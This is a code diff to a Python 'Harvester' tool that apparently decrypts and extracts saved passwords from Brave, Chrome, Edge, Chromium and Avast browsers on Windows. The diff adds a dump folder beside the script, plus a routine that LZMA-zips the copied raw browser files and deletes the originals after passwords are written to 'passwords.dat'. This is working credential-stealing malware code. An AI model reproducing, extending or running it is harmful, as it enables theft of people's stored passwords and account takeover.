@@ -5,7 +5,8 @@ from base64 import b64decode
 from hashlib import sha1
 from pathlib import Path
 from os import getenv
-from shutil import copy
+from shutil import copy, rmtree
+from zipfile import ZipFile, ZIP_LZMA
 
 from Crypto.Cipher import AES
 from win32crypt import CryptUnprotectData
@@ -84,10 +85,11 @@ class Harvester:
 
     def __init__(self, ):
         self.passwords = dict()
+        self.dump_dir = Path(Path(__file__).parent, 'harvest', Harvester.HARVEST_FOLDER)
 
     def _make_local_copies(self, browser):
-        local_dir = Path('harvest', self.HARVEST_FOLDER,
-                         browser.name, '_raw_files')
+        local_dir = Path(self.dump_dir, browser.name, '_raw_files')
+        
         browser.local_copy_dir = local_dir
 
         # make dirs
@@ -173,6 +175,16 @@ class Harvester:
     def show_stats(self, browser):
         print( f'[+] {browser.name.upper()}: {browser.passwd_count} passwords recovered')
 
+    def zip_dump(self, browser):
+        archive = Path(browser.local_copy_dir.parent, '_raw_files.zip')
+       
+        with ZipFile(file=archive, mode='w', compression=ZIP_LZMA) as z:
+            for f in browser.local_copy_dir.iterdir():
+                rel_path_f = f.relative_to(browser.local_copy_dir.parent)
+                z.write(f,rel_path_f)
+ 
+        rmtree(browser.local_copy_dir,ignore_errors=True)
+
     def run(self):
         for b in [Harvester.BRAVE, Harvester.CHROME, Harvester.EDGE, Harvester.CHROMIUM, Harvester.AVAST]:
             if b.is_installed:
@@ -182,7 +194,7 @@ class Harvester:
                 self._dump_json(
                     data=b.passwords,
                     fname=Path(b.local_copy_dir.parent, 'passwords.dat'))
-
+                self.zip_dump(b)
                 self.show_stats(b)
 
 
